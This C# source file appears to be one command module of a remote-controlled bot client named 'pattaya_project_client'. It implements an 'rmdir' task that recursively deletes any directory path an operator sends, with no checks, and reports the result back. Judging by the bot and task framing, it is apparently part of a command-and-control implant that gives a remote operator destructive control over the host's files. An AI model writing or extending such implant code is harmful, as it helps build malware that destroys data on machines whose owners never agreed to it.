using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System.IO;


namespace pattaya_project_client.Commands.Implements
{
    public class DeleteDirectory : BotCommand
    {
        public override string TaskName => "rmdir";

        public override string RunTask(BotTask task)
        {
            var arguments = task.Arguments.Split(' ');

            if (arguments is null || arguments.Length == 0)
            {
                return "No path provided";
            }

            var path = arguments[0];
            Directory.Delete(path, true);

            if (!Directory.Exists(path))
            {
                return $"{path} deleted";
            }


            return $"Failed to delete {path}";
        }
    }
}
